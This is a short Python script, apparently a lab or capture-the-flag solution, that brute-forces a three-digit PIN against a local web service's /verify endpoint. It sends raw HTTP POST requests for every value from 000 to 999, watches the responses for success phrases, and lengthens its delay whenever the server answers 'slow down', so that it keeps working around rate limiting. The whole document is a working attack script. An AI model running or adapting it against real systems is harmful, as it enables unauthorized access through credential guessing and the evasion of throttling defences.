import socket
import time

Address = '127.0.0.1'
Port = 8888

sleep_time = 1.0 

for pin in range(0, 1000):
    formatted_pin = f"{pin:03d}"

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((Address, Port))

        body = f"magicNumber={formatted_pin}"
        request = (
            f"POST /verify HTTP/1.1\r\n"
            f"Host: {Address}:{Port}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )

        client_socket.sendall(request.encode())
        response = b""
        while True:
            part = client_socket.recv(4096)
            if not part:
                break
            response += part

        decoded_response = response.decode(errors="ignore")

        if "congratulations" in decoded_response.lower() or "access granted" in decoded_response.lower() or "welcome" in decoded_response.lower():
            print(f"[+] Found correct PIN: {formatted_pin}")
            print(decoded_response) 
            break
        elif "slow down" in decoded_response.lower():
            print(f"[!] Server said slow down after PIN {formatted_pin}. Increasing sleep time...")
            sleep_time += 0.5
        else:
            print(f"[-] Tried PIN: {formatted_pin}")

    except Exception as e:
        print(f"[!] Error with PIN {formatted_pin}: {e}")

    finally:
        client_socket.close()

    time.sleep(sleep_time)

print("Brute force completed")
